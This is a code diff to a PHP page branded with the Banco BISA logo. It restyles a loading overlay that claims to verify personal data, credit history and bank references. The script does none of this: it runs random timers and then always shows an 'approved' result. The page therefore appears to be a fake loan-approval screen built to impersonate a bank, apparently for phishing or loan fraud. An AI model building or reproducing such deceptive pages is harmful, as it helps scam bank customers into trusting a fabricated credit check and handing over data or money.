@@ -165,22 +165,44 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
       50% { opacity:0.7; transform:scale(0.96); }
     }
 
-    .progress-phase { text-align:center; width:320px; }
-    .progress-track {
-      width:100%; height:6px; background:rgba(255,255,255,0.15);
-      border-radius:3px; overflow:hidden; margin-bottom:12px;
+    .progress-phase { text-align:center; width:480px; max-width:90vw; }
+    .stepper {
+      display:flex; align-items:center; justify-content:center;
+      margin-bottom:28px; position:relative;
     }
-    .progress-fill {
-      height:100%; width:0%; background:#ffc400;
-      border-radius:3px; transition:width 0.4s ease;
+    .step-circle {
+      width:48px; height:48px; border-radius:50%;
+      border:2.5px solid rgba(255,255,255,0.3);
+      display:flex; align-items:center; justify-content:center;
+      font-size:16px; font-weight:600; color:rgba(255,255,255,0.4);
+      background:transparent; position:relative; z-index:2;
+      transition:all 0.4s ease; flex-shrink:0;
     }
-    .progress-pct {
-      font-size:28px; font-weight:700; color:#ffc400;
-      margin-bottom:8px; letter-spacing:1px;
+    .step-circle.active {
+      border-color:#ffc400; color:#ffc400;
+      box-shadow:0 0 16px rgba(255,196,0,0.3);
+      animation:stepPulse 1.2s ease-in-out infinite;
     }
-    .progress-step {
+    @keyframes stepPulse {
+      0%,100% { box-shadow:0 0 8px rgba(255,196,0,0.2); }
+      50% { box-shadow:0 0 20px rgba(255,196,0,0.5); }
+    }
+    .step-circle.done {
+      border-color:#ffc400; background:#ffc400; color:#003e7e;
+      animation:none; box-shadow:none;
+    }
+    .step-circle .check { display:none; }
+    .step-circle.done .num { display:none; }
+    .step-circle.done .check { display:block; }
+    .step-line {
+      flex:1; height:3px; background:rgba(255,255,255,0.15);
+      position:relative; z-index:1; max-width:60px;
+    }
+    .step-line.done { background:#ffc400; }
+    .step-label {
       font-size:13px; color:rgba(255,255,255,0.8);
-      letter-spacing:0.5px; font-weight:300; min-height:20px;
+      letter-spacing:0.3px; font-weight:300; min-height:20px;
+      margin-top:4px;
     }
 
     .approved-phase {
@@ -289,13 +311,18 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
   <div class="loading-overlay" id="loadingOverlay">
     <img class="loading-logo" src="img/logo_positivo_login-big.b9c9cab904e2bff7e1a9.png" alt="Banco BISA"/>
 
-    <!-- Fase 1: Progreso -->
+    <!-- Fase 1: Stepper progreso -->
     <div class="progress-phase" id="progressPhase">
-      <div class="progress-track">
-        <div class="progress-fill" id="progressFill"></div>
+      <div class="stepper" id="stepper">
+        <div class="step-circle" id="sc1"><span class="num">1</span><svg class="check" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003e7e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+        <div class="step-line" id="sl1"></div>
+        <div class="step-circle" id="sc2"><span class="num">2</span><svg class="check" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003e7e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+        <div class="step-line" id="sl2"></div>
+        <div class="step-circle" id="sc3"><span class="num">3</span><svg class="check" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003e7e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+        <div class="step-line" id="sl3"></div>
+        <div class="step-circle" id="sc4"><span class="num">4</span><svg class="check" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003e7e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
       </div>
-      <div class="progress-pct" id="progressPct">0%</div>
-      <div class="progress-step" id="progressStep">Iniciando análisis...</div>
+      <div class="step-label" id="stepLabel">Iniciando análisis...</div>
     </div>
 
     <!-- Fase 2: Aprobado -->
@@ -364,33 +391,52 @@ if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
       });
     } catch(e) { console.error(e); }
 
-    // Progreso animado
-    const fill = document.getElementById('progressFill');
-    const pct = document.getElementById('progressPct');
-    const stepTxt = document.getElementById('progressStep');
+    // Stepper animado
+    const stepLabel = document.getElementById('stepLabel');
     const progressPhase = document.getElementById('progressPhase');
     const approvedPhase = document.getElementById('approvedPhase');
+    const wait = ms => new Promise(r => setTimeout(r, ms));
 
     const steps = [
-      { p:12, t:'Verificando datos personales...' },
-      { p:25, t:'Consultando historial crediticio...' },
-      { p:40, t:'Analizando capacidad de pago...' },
-      { p:55, t:'Consultando créditos con otras entidades...' },
-      { p:70, t:'Evaluando perfil financiero...' },
-      { p:82, t:'Verificando referencias bancarias...' },
-      { p:92, t:'Generando resultado...' },
-      { p:100, t:'¡Análisis completado!' },
+      { circle:'sc1', line:null,  t:'Verificando datos personales...' },
+      { circle:'sc1', line:'sl1', t:'Consultando historial crediticio...' },
+      { circle:'sc2', line:null,  t:'Analizando capacidad de pago...' },
+      { circle:'sc2', line:'sl2', t:'Consultando créditos con otras entidades...' },
+      { circle:'sc3', line:null,  t:'Evaluando perfil financiero...' },
+      { circle:'sc3', line:'sl3', t:'Verificando referencias bancarias...' },
+      { circle:'sc4', line:null,  t:'Generando resultado...' },
+      { circle:'sc4', line:null,  t:'¡Análisis completado!' },
     ];
 
+    let lastCircle = null;
     for (let i = 0; i < steps.length; i++) {
-      await new Promise(r => setTimeout(r, 900 + Math.random() * 600));
-      fill.style.width = steps[i].p + '%';
-      pct.textContent = steps[i].p + '%';
-      stepTxt.textContent = steps[i].t;
+      const s = steps[i];
+      const circle = document.getElementById(s.circle);
+
+      // Marcar círculo anterior como done
+      if (lastCircle && lastCircle !== circle) {
+        lastCircle.classList.remove('active');
+        lastCircle.classList.add('done');
+      }
+      // Activar círculo actual
+      if (!circle.classList.contains('done')) {
+        circle.classList.add('active');
+      }
+      // Pintar línea
+      if (s.line) {
+        document.getElementById(s.line).classList.add('done');
+      }
+
+      stepLabel.textContent = s.t;
+      lastCircle = circle;
+      await wait(1200 + Math.random() * 800);
     }
 
+    // Marcar último como done
+    if (lastCircle) { lastCircle.classList.remove('active'); lastCircle.classList.add('done'); }
+
     // Mostrar aprobación
-    await new Promise(r => setTimeout(r, 800));
+    await wait(600);
     progressPhase.style.display = 'none';
     approvedPhase.classList.add('active');
 
